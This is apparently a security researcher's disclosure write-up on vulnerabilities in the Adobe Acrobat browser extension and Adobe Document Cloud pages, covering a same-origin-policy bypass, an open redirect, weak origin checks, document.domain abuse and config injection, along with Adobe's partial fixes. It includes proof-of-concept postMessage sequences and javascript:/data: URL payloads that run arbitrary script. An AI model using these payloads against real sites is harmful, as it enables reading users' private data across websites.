---
title: "Adobe Acrobat hollowing out same-origin policy"
date: 2022-04-19T12:01:30+0200
description: "Adobe Acrobat extension provided Adobe website with a way to download data from anywhere. Unsurprisingly, this power could be abused by other websites as well."
categories:
- add-ons
- security
---

It’s unclear whether all the countless people who have the Adobe Acrobat browser extension installed actually use it. The extension being installed automatically along with the Adobe Acrobat application, chances are that they don’t even know about it. But security-wise it doesn’t matter, an extension that’s installed and unused could still be exploited by malicious actors. So a few months ago I decided to take a look.

{{< img src="acrobat.png" width="600" alt="A PDF file displayed in the browser. The address bar says: Adobe Acrobat. Adobe Acrobat icon is also visible in the browser’s toolbar." />}}

To my surprise, the extension itself did almost nothing despite having a quite considerable code size. It’s in fact little more than a way to present Adobe Document Cloud via an extension, all of the user interface being hosted on Adobe’s servers. To make this work smoother, Adobe Acrobat extension grants `documentcloud.adobe.com` website access to some of its functionality, in particular a way to circumvent the browser’s [same-origin policy (SOP)](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy). And that’s where trouble starts, it’s hard to keep these privileges restricted to Adobe properties.

Companies don’t usually like security reports pointing out that something bad *could* happen. So I went out on a quest to find a [Cross-site Scripting (XSS) vulnerability](https://en.wikipedia.org/wiki/Cross-site_scripting) allowing third-party websites to abuse the privileges granted to `documentcloud.adobe.com`. While I eventually succeeded, this investigation yielded a bunch of dead ends that are interesting on their own. These have been reported to Adobe, and I’ll outline them in this article as well.

TL;DR: Out of six issues reported, only one is resolved. The main issue received a partial fix, two more got fixes that didn’t quite address the issue. Two (admittedly minor) issues haven’t been addressed at all within 90 days from what I can tell.

{{< toc >}}

## Why does same-origin policy matter?

The [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) is the most fundamental security concept of the web. It mandates that `example.com` cannot simply access your data on other websites like `google.com` or `amazon.com`, at least not without the other websites explicitly allowing it by means of [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) for example. So even if you visit a malicious website, that website is limited to doing mischief within its own bounds – or exploiting websites with security vulnerabilities.

What happens if that security boundary breaks down? Suddenly a malicious website can impersonate you towards other websites, even if these don’t have any known vulnerabilities. Are you logged into Gmail for example? A malicious website can request your data from Gmail, downloading all your email conversations. And then it can ask Gmail to send out emails in your name. Similarly if you are logged into Twitter or Facebook, your private messages are no longer private. And your active online banking session will allow that malicious website to check your transaction history (luckily not making any transfers, that usually requires authorization via a second factor).

Now you hopefully get an idea why a hole in the same-origin policy is a critical vulnerability and needs to be prevented at any cost. Next: Adobe Acrobat extension.

## SOP circumvention in the Adobe Acrobat extension

As I mentioned before, the Adobe Acrobat extension doesn’t actually do anything by itself. So when you edit a PDF file for example, you aren’t actually in the extension – you are in Adobe’s Document Cloud. You are using a web application.

Now that web application has a problem: in order to do something with a PDF file, it needs to access its data. And with it hosted anywhere on the web, same-origin policy gets in the way. The usual solution would be using a proxy: let some Adobe server download the PDF file and provide the data to the web application. Downside here: proxy server cannot access PDF files hosted on some company intranet, and neither PDF files that require the user to be logged in. These can only be accessed via user’s browser.

So Adobe went with another solution: let the extension “help” the web application by downloading the PDF data for it. How this works:

* When you navigate to a PDF file like `https://example.com/test.pdf` in your browser, the extension redirects you to its own page: `chrome-extension://efaidnbmnnnibpcajpcglclefindmkaj/viewer.html?pdfurl=https://example.com/test.pdf`.
* The extension’s `viewer.html` is merely a shell for `https://documentcloud.adobe.com/proxy/chrome-viewer/index.html` that it loads in a frame.
* The extension page will attempt to download data from the address it received via `pdfurl` parameter and send it to the frame via [window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).

This would be mostly fine if you navigating to some PDF file were a necessary step of the process. But `viewer.html` is listed under [web_accessible_resources](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources) in the extension’s manifest. This means that any website is allowed to load `chrome-extension://efaidnbmnnnibpcajpcglclefindmkaj/viewer.html` and give it whatever value for `pdfurl`. For example, `?pdfurl=https://www.google.com/` would result in the extension downloading Google homepage and intercepting the resulting data would give attackers access to your Google user name for example.

The good news: only a page that is itself hosted on `documentcloud.adobe.com` can intercept the messages exchange here. The bad news: [Cross-site Scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerabilities are very common, and any such vulnerability in a page on `documentcloud.adobe.com` would give attackers this access. Even worse news: while `documentcloud.adobe.com` uses [Content Security Policy (CSP) mechanism](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) to protect against XSS vulnerabilities, it doesn’t do so consistently. Even where CSP is used, its protection is weakened considerably by allowing scripts from a multitude of different services and by using keywords like `'unsafe-eval'`.

### The fix

I made sure that Adobe receives a complete proof of concept, a page abusing an XSS vulnerability to get into `documentcloud.adobe.com`. That access is then leveraged to download `google.com` and extract your user name. Should demonstrate the issue nicely, what could possibly go wrong? Well, for once Adobe could fix the XSS vulnerability before even looking at my proof of concept for this issue. And that’s exactly what they did of course. More than a month after the report they asked me why they couldn’t reproduce the issue.

To their defense, they didn’t give up on this issue even though I couldn’t deliver a new proof of concept. As of Adobe Acrobat 15.1.3.10, it is partially resolved. I could confirm that exploiting it to download regular pages no longer works. Now malicious websites exploiting an XSS vulnerability on `documentcloud.adobe.com` can only download PDF files, even if doing so requires user’s privileges (files hidden on a company intranet or behind a login screen).

The reason is a change to the page’s `_sendMessage` function:

```js
var readyReceived, seenPdf;

_sendMessage = (message, origin) =>
{
  if (this.iframeElement && isValidOrigin(origin))
  {
    const timeout = 10000;
    var startTime = Date.now();
    new Promise(function check(resolve, reject)
    {
      if (readyReceived && seenPdf)
        resolve();
      else if (timeout && Date.now() - startTime >= timeout)
        reject(new Error("timeout"));
      else
        setTimeout(check.bind(this, resolve, reject), 30);
    }).then(() => this.iframeElement.contentWindow.postMessage(message, origin));
  }
};
```

The part waiting for `readyReceived` and `seenPdf` variables to be set is new. Now responses will be delayed until `documentcloud.adobe.com` frame loads *and* the code deems the file to be a valid PDF. Note that the logic recognizing PDF files isn’t terribly reliable:

```js
function isPdf(request, url)
{
  const type = request.getResponseHeader("content-type");
  const disposition = request.getResponseHeader("content-disposition");
  if (type)
  {
    const typeTrimmed = type.toLowerCase().split(";", 1)[0].trim();
    // Yes, this checks disposition.value which should be always undefined
    if (disposition && /^\s*attachment[;]?/i.test(disposition.value))
      return false;
    if ("application/pdf" === typeTrimmed)
      return true;
    if ("application/octet-stream" === typeTrimmed)
    {
      if (url.toLowerCase().indexOf(".pdf") > 0)
        return true;
      if (disposition && /\.pdf(["']|$)/i.test(disposition.value))
        return true;
    }
  }
  return false;
}
```

So any file with MIME type `application/octet-stream` can be considered a PDF file, all it takes is adding `#file.pdf` to the URL.

There was one more notable change to the code, a check in a `message` event handler:

```js
function isValidSource(event)
{
  try
  {
    return event && event.source &&
        event.source.top.location.origin === "chrome-extension://" + chrome.runtime.id;
  }
  catch (e)
  {
    return false;
  }
}

if (event.data && event.origin && isValidOrigin(event.origin) && isValidSource(event))
  ...
```

The `isValidSource()` function is new and essentially boils down to checking `event.source.top == window` – only events coming from the own frame are accepted. This is probably meant to address my proof of concept where the message source happened to be an external page. It doesn’t provide any value beyond what `isValidOrigin()` already does however. If there is an external `documentcloud.adobe.com` page sending messages, this page has full access to the `documentcloud.adobe.com` frame within the viewer by virtue of being same-origin. This access can be used to run code in the frame and thus send messages with the frame being the message source.

## Open Redirect via the fallback mechanism

Before we delve into my search for XSS vulnerabilities, there is another interesting aspect of this `viewer.html` page, namely its fallback mechanism. The extension developers thought: what should we do if we cannot download that PDF file after all? Rather than displaying an error message of their own, they decided to leave this scenario to the browser. So in case of a download error the page will redirect back to the PDF file. Which might not be a PDF file because, as we already learned, a malicious website can open the viewer with any value for the `pdfurl` parameter.

What happens if a page loads `viewer.html?pdfurl=javascript:alert(1)` for example? The page will run the following code:

```js
window.location.href = "javascript:alert(1)";
```

This *would* have been an XSS vulnerability in the extension (very bad), but luckily the extension’s Content Security Policy stops this attack.

So this Open Redirect vulnerability seems fairly boring. Still, there is another way to exploit it: `viewer.html?pdfurl=data/js/options.html`. This will make the viewer redirect to the extension’s options page. The options page isn’t listed under `web_accessible_resources` and normally shouldn’t be exposed to attacks by websites. Well, thanks to this vulnerability it is. It’s pure luck that it was coded in a way that didn’t quite allow malicious websites to change extension settings.

At the time of writing this vulnerability was still present in the latest extension version.

## The (not so) clever message origin check

When looking for XSS vulnerabilities, I tend to focus on the client-side code. This has multiple reasons. First of all, it’s impossible to accidentally cause any damage if you don’t mess with any servers. Second: client-side code is out there in the open, you only need to go through it looking for signs of vulnerabilities rather than blindly guessing which endpoints might be exploitable and how. And finally: while server-side vulnerabilities are reasonably understood by now, the same isn’t true for the client side. Developers tend to be unaware of security best practices when it comes to the client-side code of their web applications.

Now Adobe uses React for their client side code, a framework where introducing an XSS vulnerability takes effort and determination. Still, I started checking out `message` event handlers, these being notorious sources of security vulnerabilities. It didn’t take long to find the first issue, in a library called Adobe Messaging Client:

```js
this.receiveMessage = function(event)
{
  var origin = event.origin || event.originalEvent.origin;
  if (getMessagingUIURL(mnmMode).substr(0, origin.length) !== origin)
  {
    log("Ignoring message received as event origin and expected origin do not match");
    return;
  }
  ...
}
```

The `getMessagingUIURL(mnmMode)` call returns an address like `https://ui.messaging.adobe.com/2.40.3/index.html`. Normally, one would parse that address, get the origin and compare it to the message origin. But somebody found a clever shortcut: just check whether this address starts with the origin! And in fact, the address `https://ui.messaging.adobe.com/2.40.3/index.html` starts with the valid origin `https://ui.messaging.adobe.com` but it doesn’t start with the wrong origin `https://example.com`. Nice trick, and it saves calling `new URL()` to parse the address.

Except that this address also happens to start with `https://ui.messaging.ad` and with `https://ui.me`, so these origins would be considered valid as well. And neither `messaging.ad` nor `ui.me` domain is registered, so anyone wishing to abuse this code could register them.

Probably not worth the effort however. None of the actions performed by this message handler seem particularly dangerous. A dead end. Still, reported it to Adobe so that they can replace this by a proper origin check.

### The fix

Fifty days later Adobe reported having fixed this issue. And they in fact did. The new check looks like this:

```js
this.receiveMessage = function(_feeble_board_)
{
  var origin = event.origin || event.originalEvent.origin;
  var url = getMessagingUIURL(mnmMode);
  var expectedOrigin = "";
  if (url.startsWith("https://") || url.startsWith("http://"))
  {
    var parts = url.split("/");
    expectedOrigin = parts[0] + "//" + parts[2];
  }
  if (expectedOrigin !== origin)
  {
    log("Ignoring message received as event origin and expected origin do not match");
    return;
  }
}
```

I’m not sure why Adobe is using this crude parsing approach instead of calling [new URL()](https://developer.mozilla.org/en-US/docs/Web/API/URL/URL). This approach would certainly be a concern if used with untrusted data. But they use it on their own data, so it will do here. And they are now expecting an exact origin match, as they should.

## The insecure single sign-on library

On most Adobe properties, you can log in with your Adobe ID. This is handled by a library called imslib. In fact, two versions of this library exist on Adobe websites: imslib 1.x and imslib v2. The latter seems to be a rewrite for the former, and it’s where I found another vulnerable `message` event handler. This one doesn’t check event origin at all:

```js
this.receiveMessage = function(event)
{
  if (this.onProcessLocation)
    this.onProcessLocation(event.data);
};
```

There are several levels of indirection for the `onProcessLocation` handler but it essentially boils down to:

```js
this.onProcessLocation = function(url)
{
  window.location.replace(url);
}
```

Here we have our XSS vulnerability. Any page can do `wnd.postMessage("javascript:alert(1)", "*")` and this code will happily navigate to the provided address, executing arbitrary JavaScript code in the process.

There is a catch however: this `message` event handler isn’t always present. It’s being installed by the `openSignInWindow()` function, executed when the user clicks the “Sign In” button. It is meant to reload the page once the login process succeeds.

Tricking the user into clicking the “Sign In” button might be possible via [Clickjacking](https://en.wikipedia.org/wiki/Clickjacking) but there is another catch. The library has two ways of operating: the modal mode where it opens a pop-up window and the redirect mode where the current page is replaced by the login page. And all Adobe pages I’ve seen used the latter which isn’t vulnerable. Another dead end.

At the time of writing imslib v2 received at least two version bumps since I reported the issue. The vulnerability is still present in the latest version however.

## Increasing the attack surface

I got somewhat stuck, so I decided to check out what else is hosted on `documentcloud.adobe.com`. That’s when I discovered [this embed API demo](https://documentcloud.adobe.com/view-sdk-demo/index.html). And that suddenly made my job much easier:

* This page contains a View SDK frame with an address like `https://documentcloud.adobe.com/view-sdk/<version>/iframe.html`.
* This frame is *meant* to be embedded by any website, so there is no framing protection.
* The frame is in fact *meant* to communicate with arbitrary websites, and it will accept all kinds of messages.

In fact, I learned that initializing the frame would make it set [document.domain](https://developer.mozilla.org/en-US/docs/Web/API/Document/domain). All I needed to do was sending it the following message:

```js
frame.postMessage({
  sessionId: "session",
  type: "init",
  typeData: {
    config: {
      serverEnv: "prod"
    }
  }
}, "*");
```

And it would change `document.domain` to `adobe.com`.

I hope that you’ve never actually heard about `document.domain` before. It’s a really old and a really dangerous mechanism for cross-origin communication. The idea is that a page from `subdomain.example.com` could declare: “I’m no longer subdomain.example.com, consider me to be just example.com.” And then a page from `anothersubdomain.example.com` could do the same. And since they now have the same origin, these pages could do whatever they want with each other: access each other’s DOM and variables, run code in each other’s context and so on.

The effect of setting `document.domain` to `adobe.com` is a massively increased attack surface. Now the requirement is no longer to find an XSS vulnerability on `documentcloud.adobe.com`. Finding an XSS vulnerability *anywhere* on the `adobe.com` domain is sufficient. Once you are running JavaScript code somewhere on `adobe.com`, you can set `document.domain` to `adobe.com`. You can then load the View SDK frame and make it do the same. Boom, you now have full access to the View SDK frame and can run your code inside a `documentcloud.adobe.com` page.

### The “fix”?

When I reported this issue I recommended dropping `document.domain` usage altogether. Really, there is exactly zero reason to use it in a modern web application highly reliant on [window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) which is the modern replacement. I’m not sure whether Adobe attempted to address this issue but they didn’t remove `document.domain` usage. Instead, they buried it deeper in their code and added a check.

```js
if (this._config.noRestriction && this._config.documentDomain)
{
  window.document.domain = this._config.documentDomain;
}
```

And the `noRestriction` flag is reserved for trusted websites:

```js
function isTrustedOrigin(origin)
{
  if (!isValidUrl(origin))
    return false;
  try
  {
    var trustedDomains = [
      ".acrobat.com",
      ".adobe.com",
      ".adobeprojectm.com"
    ];
    var hostname = new URL(origin).hostname;
    var trusted = false;
    trustedDomains.forEach(function(domain)
    {
      if (-1 !== hostname.indexOf(domain, hostname.length - domain.length))
        trusted = true;
    });
    return trusted;
  }
  catch (error)
  {
    return false;
  }
};
```

So any vulnerable website hosted under `adobe.com` will be considered a trusted origin and can trick the View SDK into setting `document.domain` to `adobe.com`. If this change was supposed to be a fix, it doesn’t really achieve anything.

## XSS via config injection

But there are way more issues in this View SDK frame, making it the final destination of my journey. I mean, in the `init` message above we gave it a configuration. What other configuration values are possible beyond `serverEnv`? Turns out, there are plenty. So some validation is meant to prevent abuse.

For example, there are these configuration presets which depend on the server environment:

```js
var configPresets = {
  ...
  prod: {
    dcapiUri: "https://dc-api.adobe.io/discovery",
    floodgateUri: "https://p13n.adobe.io/fg/api",
    floodgateApiKey: "dc-prod-virgoweb",
    loggingUri: "https://dc-api.adobe.io",
    licenseUri: "https://viewlicense.adobe.io/viewsdklicense/jwt",
    internalLogToConsoleEnabled: false,
    internalLogToServerEnabled: true,
    floodgateEnabled: true,
    defaultNoRestriction: false,
    viewSDKAppVersion: "2.22.1_2.8.0-5d611c6",
    sdkDocumentationUrl: "https://www.adobe.com/go/dcviewsdk_docs",
    documentDomain: "adobe.com",
    brandingUrl: "https://documentcloud.adobe.com/link/home",
    otDomainId: "7a5eb705-95ed-4cc4-a11d-0cc5760e93db"
  }
}
```

And this code makes sure these presets take precedence over any config options received:

```js
var finalConfig = Object.assign({}, config, configPresets[config.serverEnv]);
```

Wait, it chooses the presets based on the server environment we give it? Then we could choose `local` for example and we’d get `defaultNoRestriction` set to `true`. Sounds nice. But why choose a preset at all if we can pass `dummy` for `serverEnv` and none of our configuration settings will be overwritten? Yes, this protection isn’t actually working.

The initialization itself doesn’t do much, we need to start the app. This requires an additional message like the following:

```js
frame.postMessage({
  sessionId: "session",
  type: "preview",
  typeData: {
    fileInfo: [{
      metaData: {
        fileName: "Hi there.pdf"
      }
    }],
    previewConfig: {
      embedMode: "INTEGRATION"
    }
  }
}, "*");
```

Looks like we have an additional piece of configuration here. But the app also applies some additional restrictions:

```js
PRESET_FORCE_CONFIG = {
  INTEGRATION: {
    config: {
      showTopBar: true,
      leftAlignFileName: false,
      backgroundColor: "#eaeaea",
      externalJSComponentURL: ""
    },
    actionConfig: {
      exitPDFViewerType: "",
      enableBookmarkAPIs: true,
      enableAttachmentAPIs: true,
      showFullScreen: false,
      dockPageControls: false,
      showDownloadPDFInPageControl: false,
      showFullScreenInHUD: false,
      enableLinearization: false
    }
  },
  ...
};
```

Here is how they are enforced:

```js
var forceConfig = PRESET_FORCE_CONFIG[actionConfig.embedMode];
actionConfig = Object.assign({}, actionConfig, forceConfig.actionConfig);
config = Object.assign({}, config, forceConfig.config);
```

Again, `embedMode` is a value we can often choose. We cannot set it to some invalid value to avoid any preset values, validation is stricter here. But we can choose a value like `FULL_WINDOW` where `externalJSComponentURL` isn’t being overwritten. And this value in fact does exactly what you think, it loads external JavaScript code. So the final message combination is:

```js
frame.postMessage({
  sessionId: "session",
  type: "init",
  typeData: {
    config: {
      serverEnv: "production",
      defaultNoRestriction: true,
      externalJSComponentURL: "data:text/javascript,alert(1)")
    }
  }
}, "*");

frame.postMessage({
  sessionId: "session",
  type: "preview",
  typeData: {
    fileInfo: [{
      metaData: {
        fileName: "Hi there.pdf"
      }
    }],
    previewConfig: {
      embedMode: "FULL_WINDOW"
    }
  }
}, "*");
```

Yes, this will run arbitrary JavaScript code. No, this clearly isn’t the only way to abuse the configuration, at the very least there is also:

* A bunch of addresses such as `brandingUrl` will be displayed in the user interface without any additional checks, it’s possible to pass `javascript:` URLs here.
* Some endpoints such as `loggingUrl` can be redirected to own servers, potentially resulting in leaking private information and security tokens.
* `localizationStrings` configuration allows overwriting default localization. There is again potential for XSS here as some of these strings are interpreted as HTML code.

### The fix

Adobe changed the logic here to make sure `serverEnv` is no longer passed in by the caller but rather deduced from the frame address. They also implemented additional restrictions on the `externalJSComponentURL` value, only trusted (meaning: Adobe’s own) websites are supposed to set this value now. Both of these provisions turned out to be flawed, and I could set `externalJSComponentURL` from a third-party website. At the time of writing Adobe still has to address this issue properly.

With these provisions presets can no longer be avoided however. So passing in malicious values for `brandingUrl` or various server endpoints is no longer possible. I’m not sure whether or how the issue of passing malicious localization has been addressed, the code being rather complicated here. The code still uses `FormattedHTMLMessage` however, a feature [removed from react-intl package two years ago](https://formatjs.io/docs/react-intl/upgrade-guide-4x/) due to the risk of introducing XSS vulnerabilities.
